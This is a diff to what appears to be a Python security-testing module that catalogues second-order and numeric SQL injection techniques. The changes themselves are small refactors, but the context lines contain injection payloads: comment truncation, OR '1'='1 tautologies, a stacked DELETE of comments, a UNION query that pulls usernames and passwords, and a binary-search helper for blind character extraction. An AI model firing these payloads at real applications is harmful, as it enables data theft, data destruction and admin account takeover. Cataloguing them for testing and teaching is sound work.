@@ -23,7 +23,7 @@ Author: Megido Security Team
 Version: 1.0.0
 """
 
-from typing import Dict, List, Tuple, Optional
+from typing import Dict, List, Tuple, Optional, Any
 from enum import Enum
 import string
 
@@ -58,7 +58,7 @@ class SecondOrderInjection:
         'user_registration': {
             'description': 'Malicious username is stored during registration, '
                           'then executed when admin views user list',
-            'step_1_insert': "INSERT INTO users (username, password) VALUES (?, ?)",
+            'step_1_query': "INSERT INTO users (username, password) VALUES (?, ?)",
             'step_1_payload': "admin'-- ",
             'step_2_query': "SELECT * FROM users WHERE username='admin'-- ' AND status='active'",
             'step_2_result': "The comment (--) causes the rest of the query to be ignored, "
@@ -69,7 +69,7 @@ class SecondOrderInjection:
         'profile_update': {
             'description': 'Malicious data stored in profile field, '
                           'executed when generating reports',
-            'step_1_insert': "UPDATE users SET bio=? WHERE user_id=123",
+            'step_1_query': "UPDATE users SET bio=? WHERE user_id=123",
             'step_1_payload': "test' OR '1'='1",
             'step_2_query': "SELECT * FROM users WHERE bio LIKE '%test' OR '1'='1%'",
             'step_2_result': "Injected OR clause modifies the WHERE condition, "
@@ -79,7 +79,7 @@ class SecondOrderInjection:
         
         'password_change': {
             'description': 'Username from session is used unsafely in password update query',
-            'step_1_insert': "INSERT INTO users (username) VALUES (?)",
+            'step_1_query': "INSERT INTO users (username) VALUES (?)",
             'step_1_payload': "victim' OR username='admin",
             'step_2_query': "UPDATE users SET password='newpass' WHERE username='victim' OR username='admin'",
             'step_2_result': "Password is changed for both victim and admin accounts",
@@ -89,7 +89,7 @@ class SecondOrderInjection:
         'comment_moderation': {
             'description': 'Comment content is stored safely but executed when admin '
                           'performs bulk operations',
-            'step_1_insert': "INSERT INTO comments (content, author) VALUES (?, ?)",
+            'step_1_query': "INSERT INTO comments (content, author) VALUES (?, ?)",
             'step_1_payload': "Great post!'; DELETE FROM comments WHERE '1'='1",
             'step_2_query': "DELETE FROM comments WHERE content='Great post!'; "
                            "DELETE FROM comments WHERE '1'='1' AND moderated=0",
@@ -99,7 +99,7 @@ class SecondOrderInjection:
         
         'search_history': {
             'description': 'Search terms stored and later used in analytics queries',
-            'step_1_insert': "INSERT INTO search_log (term, user_id) VALUES (?, ?)",
+            'step_1_query': "INSERT INTO search_log (term, user_id) VALUES (?, ?)",
             'step_1_payload': "') UNION SELECT username,password FROM users--",
             'step_2_query': "SELECT term FROM search_log WHERE term LIKE '%') UNION SELECT username,password FROM users--%'",
             'step_2_result': "UNION attack extracts sensitive data during analytics",
@@ -748,6 +748,9 @@ class NumericExploitation:
             >>> NumericExploitation.binary_search_ascii(test)
             65
         """
+        original_min = min_val
+        original_max = max_val
+        
         while min_val <= max_val:
             mid = (min_val + max_val) // 2
             
@@ -760,7 +763,10 @@ class NumericExploitation:
             except Exception:
                 return None
         
-        return min_val if min_val <= 126 else None
+        # Verify result is within original search range
+        if original_min <= min_val <= original_max:
+            return min_val
+        return None
     
     @staticmethod
     def get_numeric_exploitation_examples() -> List[Dict[str, str]]:
@@ -911,7 +917,7 @@ class ExploitationWorkflow:
     """
     
     @staticmethod
-    def get_second_order_workflow() -> Dict[str, any]:
+    def get_second_order_workflow() -> Dict[str, Any]:
         """
         Get complete workflow for exploiting second-order SQL injection.
         
@@ -987,7 +993,7 @@ class ExploitationWorkflow:
         }
     
     @staticmethod
-    def get_numeric_extraction_workflow() -> Dict[str, any]:
+    def get_numeric_extraction_workflow() -> Dict[str, Any]:
         """
         Get complete workflow for numeric-only field exploitation.
         
